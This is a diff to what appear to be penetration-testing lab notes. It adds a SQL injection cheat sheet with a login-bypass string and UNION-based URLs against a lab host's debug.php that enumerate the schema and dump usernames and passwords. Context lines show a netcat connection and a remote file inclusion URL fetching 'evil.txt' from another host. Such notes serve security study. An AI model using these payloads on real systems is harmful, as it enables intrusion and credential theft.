@@ -42,4 +42,27 @@ nc -nv 10.11.0.22 80
 
 `http://192.168.175.10/menu.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt`
 
+### SQL Injection
 
+```
+
+jim' or 1=1 limit 1;#
+
+
+http://10.11.0.22/debug.php?id=1 order by 1
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version 
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+
+http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
+
+
+
+```
